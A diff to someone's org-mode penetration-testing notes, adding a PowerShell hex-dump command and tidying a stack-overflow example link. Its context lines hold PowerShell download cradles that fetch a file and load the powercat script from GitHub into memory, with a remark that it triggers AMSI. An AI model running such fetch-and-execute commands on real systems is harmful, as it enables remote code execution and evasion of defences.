@@ -775,6 +775,9 @@ END   { print "\"<regex>\" appears in", n, "records." }' mail-list
 *** powershell DownloadFile && *DownloadString*
     + ~powershell -c "(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/wget.exe','./wget.exe')"~
     + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //load the remote script during the session only 
+      
+*** powerhsell xxd
+    Format-Hex -Path <path> -Count <firstNBytesToShow>
 
 *** @Deprecated ~powercat~ //!triggers amsi
     + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //!triggers amsi
@@ -909,9 +912,8 @@ whoos <domain>
         - *EIP* (instruction pointer): points to the *next* instruction to be executed.
           
 *** the example:
-    +
-    [[./staceOverflow/so_Basic.c][so_Basic.c]]
-        
+    + [[./staceOverflow/so_Basic.c][so_Basic.c]]
+      
 
 
 
